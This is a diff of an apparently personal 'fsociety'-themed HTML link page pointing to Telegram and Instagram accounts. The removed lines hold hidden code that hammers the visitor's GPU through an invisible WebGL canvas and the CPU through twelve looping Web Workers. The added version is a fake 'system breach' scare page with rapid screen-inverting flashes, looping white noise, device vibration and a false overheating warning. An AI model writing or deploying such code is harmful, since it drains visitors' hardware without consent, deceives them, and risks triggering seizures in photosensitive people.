@@ -3,35 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>INDLENDD // SYSTEM_MAX_LOAD</title>
+    <title>FSOCIETY // CRITICAL_ERROR</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
-        * { box-sizing: border-box; cursor: crosshair; margin: 0; padding: 0; }
-        body { background-color: #000; color: #fff; font-family: 'Courier Prime', monospace; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-        
-        /* Невидимый "нагреватель" GPU */
-        #heater { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; pointer-events: none; z-index: -1; }
+        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
 
-        .drop { position: absolute; top: -100px; width: 2px; background: linear-gradient(to bottom, transparent, #fff); z-index: 999; animation: fall linear infinite; }
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Courier Prime', monospace;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Эффект тряски экрана (Visual Stress) */
+        .glitch-screen {
+            animation: shake 0.05s infinite;
+            display: none;
+            width: 100%;
+            height: 100%;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        @keyframes shake {
+            0% { transform: translate(1px, 1px); }
+            50% { transform: translate(-2px, -1px); filter: invert(1); }
+            100% { transform: translate(1px, 1px); }
+        }
+
+        /* Стекающая кровь */
+        .drop {
+            position: absolute; top: -100px; width: 2px;
+            background: #fff; z-index: 999; pointer-events: none;
+            animation: fall linear infinite;
+        }
         @keyframes fall { to { transform: translateY(110vh); } }
-        #intro { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
-        .intro-t { letter-spacing: 12px; opacity: 0; transition: 1.5s; text-align: center; }
-        .content-wrapper { position: relative; z-index: 10; width: 90%; max-width: 600px; display: none; flex-direction: column; align-items: center; text-align: center; }
-        .fsociety-mask { font-size: 6px; line-height: 7px; white-space: pre; margin-bottom: 30px; }
-        .btn { border: 1px solid #fff; padding: 12px; color: #fff; text-decoration: none; font-weight: bold; width: 100%; margin: 5px; }
+
+        /* Интро */
+        #intro {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 100;
+            text-align: center;
+        }
+        .intro-btn {
+            border: 1px solid #fff; padding: 20px; color: #fff;
+            text-decoration: none; letter-spacing: 5px; cursor: pointer;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+
+        /* Маска fsociety */
+        .fsociety-mask {
+            font-size: 6px; line-height: 7px; white-space: pre; 
+            margin-bottom: 30px; text-shadow: 0 0 10px #fff;
+        }
+
+        .links-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 90%; max-width: 600px; }
+        .btn { border: 1px solid #fff; padding: 15px; color: #fff; text-decoration: none; text-align: center; font-weight: bold; }
+        
+        .warning { color: red; font-size: 10px; margin-top: 20px; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-<canvas id="heater"></canvas>
+    <div id="intro">
+        <div style="margin-bottom: 20px; letter-spacing: 10px;">SYSTEM BREACH</div>
+        <div class="intro-btn" onclick="startHack()">[ INITIALIZE ]</div>
+    </div>
 
-<div id="intro">
-    <div id="t1" class="intro-t">SYSTEM OVERLOAD</div><br>
-    <div id="t2" class="intro-t">STAY CALM</div>
-</div>
-
-<div class="content-wrapper" id="main">
-    <div class="fsociety-mask">
+    <div class="glitch-screen" id="main">
+        <div class="fsociety-mask">
 ⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣛⣛⣛⣛⣛⣛⣛⣛⡛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿
 ⣿⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⣿
 ⣿⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⣿
@@ -53,52 +100,57 @@
 ⣿⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠀⣿
 ⣿⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⣿
 ⠛⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠉⠉⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠛
+        </div>
+        
+        <div class="links-grid">
+            <a href="https://t.me/indlendd" class="btn">TELEGRAM<span>@indlendd</span></a>
+            <a href="https://instagram.com/moyra_atrooo" class="btn">INSTAGRAM<span>@moyra_atrooo</span></a>
+        </div>
+        
+        <div class="warning">CRITICAL_TEMP: 98°C | OVERLOAD_ACTIVE</div>
     </div>
-    <div style="display: flex; width: 100%;">
-        <a href="https://t.me/indlendd" class="btn">TELEGRAM</a>
-        <a href="https://instagram.com/moyra_atrooo" class="btn">INSTAGRAM</a>
-    </div>
-</div>
 
-<script>
-    // --- GPU OVERLOAD ---
-    const canvas = document.getElementById('heater');
-    const gl = canvas.getContext('webgl');
-    if (gl) {
-        function stress() {
-            for (let i = 0; i < 500; i++) {
-                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-                gl.clear(gl.COLOR_BUFFER_BIT);
+    <script>
+        // Звуковое давление (White Noise)
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playNoise() {
+            const bufferSize = 2 * audioCtx.sampleRate,
+            noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate),
+            output = noiseBuffer.getChannelData(0);
+            for (let i = 0; i < bufferSize; i++) {
+                output[i] = Math.random() * 2 - 1;
             }
-            requestAnimationFrame(stress);
+            const whiteNoise = audioCtx.createBufferSource();
+            whiteNoise.buffer = noiseBuffer;
+            whiteNoise.loop = true;
+            
+            const gainNode = audioCtx.createGain();
+            gainNode.gain.value = 0.1; // Громкость шума
+            
+            whiteNoise.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            whiteNoise.start();
         }
-        stress();
-    }
 
-    // --- CPU OVERLOAD (Workers) ---
-    const blob = new Blob([`setInterval(()=>{for(let i=0;i<1e7;i++){Math.sqrt(i)}},1)`]);
-    const workerUrl = URL.createObjectURL(blob);
-    for(let i=0; i<12; i++) new Worker(workerUrl);
+        // Запуск "взлома"
+        function startHack() {
+            document.getElementById('intro').style.display = 'none';
+            document.getElementById('main').style.display = 'flex';
+            playNoise();
+            if (navigator.vibrate) navigator.vibrate([100, 50, 300, 50, 500]);
+        }
 
-    // --- VISUALS ---
-    setInterval(() => {
-        const d = document.createElement('div');
-        d.className = 'drop';
-        d.style.left = Math.random() * 100 + 'vw';
-        d.style.height = Math.random() * 100 + 40 + 'px';
-        const dur = Math.random() * 1.5 + 1;
-        d.style.animation = `fall ${dur}s linear infinite`;
-        document.body.appendChild(d);
-        setTimeout(() => d.remove(), dur * 1000);
-    }, 100);
-
-    setTimeout(() => document.getElementById('t1').style.opacity = '1', 500);
-    setTimeout(() => document.getElementById('t2').style.opacity = '1', 1500);
-    setTimeout(() => {
-        document.getElementById('intro').style.display = 'none';
-        document.getElementById('main').style.display = 'flex';
-        if (navigator.vibrate) navigator.vibrate(500);
-    }, 4000);
-</script>
+        // Стекание
+        setInterval(() => {
+            const d = document.createElement('div');
+            d.className = 'drop';
+            d.style.left = Math.random() * 100 + 'vw';
+            d.style.height = Math.random() * 100 + 40 + 'px';
+            const dur = Math.random() * 1 + 0.5;
+            d.style.animation = `fall ${dur}s linear infinite`;
+            document.body.appendChild(d);
+            setTimeout(() => d.remove(), dur * 1000);
+        }, 50);
+    </script>
 </body>
 </html>
